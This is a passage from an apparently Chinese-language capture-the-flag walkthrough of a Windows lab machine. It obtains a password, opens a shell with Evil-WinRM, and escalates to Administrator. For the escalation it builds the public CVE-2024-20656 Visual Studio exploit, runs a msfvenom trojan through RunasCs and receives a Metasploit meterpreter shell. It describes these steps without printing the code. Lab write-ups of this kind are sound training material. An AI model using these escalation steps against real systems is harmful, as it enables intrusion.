D9Diw3bDE09e3uqPq0vDzOyfQTABMIcPrtMdt7a0watJTv6yqHZVrQWe2I/nqb+q0puYFiaqYVAO8sVlwNLCEhIMC/pKQy+Aw2MJA+RC0QK05hkDvCu/uS7z86VbTBYfnKv6p/UgM/PiYVoZBPgzVom9Ff+aiUAJB/FBKLKY1fYWfTpj7cn9hNqjEFYgtMf2c4qWBQx+N9MJxb4tIiQqEtCRQp64lq3Qj7f7LD7DWwtoZtXA6JaawkBBqKIUOfoQ/6ZF3mhgGmC5cRCPxOad7YB13c1IQf2q/ZuZ/0aZIOw5Diu7MtaO7Fgz1YdXU1mxYX5DFSjeSO5jj2qUXbY/QaDJdBvttZCRYcaDJWbzeHuiTUNrbrc/fdEYtk45NBfYFkjINWvMBuW1bzY9QkdMFA1JxJbF+CZzvvvcWIh9jgxWHjJFjDfia27jkK9rHtRn2MJsPsNZi2hnawxYb4Taxp11d6tcGJr3ML6G7mgz1zFX6haPvsWoGGD2S5JuZhBJ5aNOghFNsEW+ALLBkP4J4ElVBpIAH0yeAmVj7sntlp01VrgixPL3uIDkAm2qsP9PWyCs275ZW5Zd/SyYQmdWDjoNi7iixNb1VrW7NcxaC0580n2JbSTX2BZd5jVtAQ2LKs5naAuOlEveYETW+0hWrU2kmBrXsW6Zc2U3owOAl/AoEcA64IyHDEYFQOSbLFKb6IicmswYEafNQx3w0KCjUMO/QWWNcVSPcp/QlhC3YJKaZCoVDvwIYdqNwPUBZZAd5ljzivrrVD3z5vzucMSfpKkdtovktC7vj6Xd1nYsIROrNyMsd8ghD42U44IcHC2PHsFvB5pkYQ+xJ6HNNonUPsn/JnBkj5Ossq65b8LlhXd/38IS1BkzIFoXAAAAABJRU5ErkJggg==)得到密码是12345678

因为当前权限我们无法直接进入Emily的文件夹，所以接下来要使用一个Evil-Winrm

![](./images/image-143.png)

## Evil-Winrm

evil-winrm是一个可用于黑客攻击/渗透测试的Windows远程管理(WinRM) Shell。

![](./images/image-142.png)

![](./images/image-144.png)

在桌面发现user的flag，并且发现在电脑中有Visual Studio 2019

![](./images/image-145.png)

Google一下，记得用英文

## CVE-2024-20656

![](./images/image-146.png)

git clone下来，路径改为一致：[Wh04m1001/CVE-2024-20656 (github.com)](https://github.com/Wh04m1001/CVE-2024-20656)

![](./images/image-147.png)

![](./images/image-148.png)

这里187行CopyFile的第一个路径要作为靶机tmp中的第二个shell恶意文件。这个和之前的msfvenom是一样的生成方式。属性使用2019的工具集。

![](./images/image-149.png)

然后将VS改为Realase模式生成exe，并且上传到靶机。

还要上传一个RunaCs.exe用来加载木马。

[antonioCoco/RunasCs： RunasCs - Csharp 和 Windows 的开放版本内置runas.exe (github.com)](https://github.com/antonioCoco/RunasCs)

![](./images/image-151.png)

Msf同时要进行监听。

![](./images/image-150.png)

之后meterpreter就能收到shell，并且权限是Administrator，root的flag在Admin的桌面
